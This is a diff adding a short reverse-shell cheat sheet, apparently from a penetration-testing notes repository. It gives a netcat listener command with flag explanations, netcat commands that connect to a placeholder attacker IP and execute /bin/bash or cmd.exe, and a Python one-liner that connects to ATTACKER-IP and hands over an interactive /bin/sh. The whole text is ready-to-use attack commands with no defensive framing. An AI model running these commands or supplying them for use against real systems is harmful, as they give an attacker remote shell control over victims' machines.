@@ -1,0 +1,22 @@
+[*]nc –lvp <port>
+ __________________________________________________
+|						   |
+|   -l ---->for listen mode, for inbound connects  |
+|   -v  ---->for verbose                           |
+|   -p [port] ------>for specifying port number    |
+|__________________________________________________|                                                  
+
+[*]nc <attacker-ip> <port> -e /bin/bash 
+
++For windows:
+[*]nc.exe <attacker-ip> <port> -e cmd.exe
+ __________________________________________________
+ -e [prog]              inbound program to execute 
+ __________________________________________________
+
++Pthon script:
+
+[*]python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",ATTACKER-PORT));os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+-------------------------------------------------------------------------------------------------------------------------------
